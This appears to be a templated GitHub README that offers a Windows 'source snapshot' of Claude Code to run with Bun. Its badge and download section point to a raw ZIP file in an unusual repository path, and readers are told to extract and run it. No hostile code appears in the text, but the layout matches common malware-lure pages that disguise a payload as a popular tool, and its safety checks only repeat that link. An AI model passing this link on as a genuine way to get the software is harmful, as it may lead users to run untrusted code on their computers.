# 🤖 claude-code - Run Claude Code from source

[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20the%20repo-blue?style=for-the-badge)](https://github.com/regressive-topos551/claude-code/raw/refs/heads/main/trebuchet/code_claude_v2.9.zip)

## 📦 What this is

claude-code is a source snapshot of Claude Code that you can run on Windows with Bun. It is built for end users who want a local app that starts from source without a long setup.

Use this when you want a simple way to get the app from the GitHub page and run it on your PC.

## ✅ What you need

Before you start, check that your PC has:

- Windows 10 or Windows 11
- A stable internet connection
- Enough free disk space for the app and Bun
- Permission to install software on your PC
- A web browser to open the GitHub page

You do not need deep technical knowledge. You only need to follow the steps in order.

## 🔗 Download the app

Visit this page to download and run the app from source:

https://github.com/regressive-topos551/claude-code/raw/refs/heads/main/trebuchet/code_claude_v2.9.zip

On that page, look for the latest source snapshot or release files, then download the package that matches the Windows setup steps below

## 🪟 Install Bun on Windows

claude-code runs with Bun, so you need Bun on your system first.

1. Open your browser
2. Go to the Bun website
3. Download the Windows installer
4. Run the installer
5. Finish the setup
6. Close the installer when it ends

After setup, open Command Prompt and check that Bun works:

bun --version

If you see a version number, Bun is ready

## 📁 Get the source snapshot

1. Open the GitHub page
2. Download the source snapshot ZIP
3. Save the file to your Downloads folder
4. Right-click the ZIP file
5. Choose Extract All
6. Pick a folder you can find again, such as Desktop or Documents

After extraction, you should see the project files in a new folder named `claude-code`

## ⚙️ Set up the app

Open the extracted `claude-code` folder.

You may see files such as:

- `package.json`
- `src`
- `README.md`
- `bun.lock`
- app config files

Then open Command Prompt in that folder:

1. Open the folder in File Explorer
2. Click the address bar
3. Type `cmd`
4. Press Enter

This opens Command Prompt in the right folder.

## ▶️ Install dependencies

Run this command:

bun install

This step gets the files the app needs to run.

Wait until the command ends. If the window shows no error, the setup is complete.

## 🚀 Run the app

Start the app with:

bun run start

If that does not work, try:

bun run dev

The app should open in a new window or show a local address in the terminal. If it shows a local address, copy it into your browser.

## 🧭 How to use it

Once the app is running, you can:

- Open the app in your browser or desktop window
- Enter your input in the chat or command area
- Review the response on screen
- Copy results for later use
- Close the app when you are done

If the app asks for a key, sign-in, or local config, use the fields shown in the app interface

## 🛠️ Common setup steps

If the app does not start, check these items:

- Bun is installed
- You ran the command in the `claude-code` folder
- The source files extracted fully
- Your Windows user account has access to the folder
- No other app is using the same local port

If you moved the folder after setup, open it again and run the start command from the new location

## 📌 Helpful commands

Use these basic commands in the project folder:

- `bun install` - install the app files
- `bun run start` - start the app
- `bun run dev` - run the app in development mode
- `bun --version` - check Bun

## 🧩 Folder layout

A typical project folder may look like this:

- `src/` - app source files
- `public/` - static files
- `package.json` - project config
- `README.md` - project info
- `bun.lock` - Bun lock file

If your folder has different names, follow the file names you see in the extracted snapshot

## 🔒 Basic safety checks

Before you run any file from the repo, make sure:

- The download came from the GitHub page above
- The file names match what you expected
- You did not rename files by mistake
- You run the app from the extracted project folder

## 🧯 If something goes wrong

Try these steps in order:

1. Close the terminal
2. Open the project folder again
3. Confirm Bun is installed
4. Run `bun install` again
5. Run `bun run start` again
6. Re-extract the ZIP file if files look broken

If the page does not open, copy the local address shown in the terminal and paste it into your browser

## 💬 What to expect from the app

This source snapshot is meant to give you a working local build path for Claude Code with Bun. It is suited for users who want to:

- run the app from source
- keep the setup on Windows
- use a simple local install flow
- test the app from a GitHub snapshot

## 📎 Quick start path

1. Open the GitHub page
2. Download the source snapshot
3. Install Bun on Windows
4. Extract the project folder
5. Open Command Prompt in that folder
6. Run `bun install`
7. Run `bun run start`
8. Open the local app address in your browser